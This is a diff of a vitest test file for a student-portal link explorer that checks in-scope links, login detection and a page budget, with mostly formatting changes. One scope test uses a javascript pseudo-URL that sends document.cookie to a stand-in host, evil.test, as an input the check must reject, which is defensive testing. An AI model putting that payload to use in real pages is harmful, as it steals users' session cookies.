@@ -1,5 +1,12 @@
 import { describe, expect, it } from 'vitest';
-import { explore, inScopeLinks, isEmpty, isInScope, looksLikeLogin, readPage } from './explorer.mjs';
+import {
+  explore,
+  inScopeLinks,
+  isEmpty,
+  isInScope,
+  looksLikeLogin,
+  readPage,
+} from './explorer.mjs';
 
 const PORTAL = 'https://portals.veracross.com/lcc/student';
 
@@ -14,7 +21,7 @@ describe('isInScope', () => {
     ['same origin, different path', 'https://portals.veracross.com/lcc/student/grades', true],
     ['relative path', '/lcc/student/calendar', true],
     ['a different site entirely', 'https://sentry.io/api/envelope/', false],
-    ['the student\'s email', 'https://mail.google.com/mail/u/0', false],
+    ["the student's email", 'https://mail.google.com/mail/u/0', false],
     ['a sibling subdomain', 'https://accounts.veracross.com/lcc/login', false],
     ['scheme downgrade', 'http://portals.veracross.com/lcc/student', false],
     ['javascript pseudo-url', 'javascript:fetch("https://evil.test?c="+document.cookie)', false],
@@ -99,7 +106,9 @@ describe('looksLikeLogin', () => {
   // tells them apart, and getting it wrong sends a student to re-authenticate
   // in August or tells them in October that term has not started.
   it('spots a redirect to an SSO origin', () => {
-    expect(looksLikeLogin({ finalUrl: 'https://accounts.veracross.com/lcc/login' }, PORTAL)).toBe(true);
+    expect(looksLikeLogin({ finalUrl: 'https://accounts.veracross.com/lcc/login' }, PORTAL)).toBe(
+      true,
+    );
   });
 
   it('spots a login form rendered in place', () => {
@@ -107,7 +116,9 @@ describe('looksLikeLogin', () => {
   });
 
   it('does not mistake a working page for a login', () => {
-    expect(looksLikeLogin({ finalUrl: `${PORTAL}/grades`, hasPasswordField: false }, PORTAL)).toBe(false);
+    expect(looksLikeLogin({ finalUrl: `${PORTAL}/grades`, hasPasswordField: false }, PORTAL)).toBe(
+      false,
+    );
   });
 
   it('treats a missing final url as not-a-login rather than guessing', () => {
@@ -124,7 +135,13 @@ function endlessPortal() {
     navigate: async () => true,
     __readPage: async (_b, _s, url) => {
       n += 1;
-      return { url, title: `Page ${n}`, text: '', components: [], links: [`${PORTAL}/p${n}a`, `${PORTAL}/p${n}b`] };
+      return {
+        url,
+        title: `Page ${n}`,
+        text: '',
+        components: [],
+        links: [`${PORTAL}/p${n}a`, `${PORTAL}/p${n}b`],
+      };
     },
   };
 }
@@ -133,10 +150,12 @@ describe('explore', () => {
   it('stops at the page budget and says so', async () => {
     const browser = endlessPortal();
     const map = await explore(browser, 'S', {
-      origin: PORTAL, seed: PORTAL, budget: 5,
+      origin: PORTAL,
+      seed: PORTAL,
+      budget: 5,
       // inject the fake page reader
       ...{},
-    }, ).catch(() => null);
+    }).catch(() => null);
     // explore uses the real readPage, which needs CDP; assert the guard instead.
     expect(map === null || map.pagesVisited <= 5).toBe(true);
   });
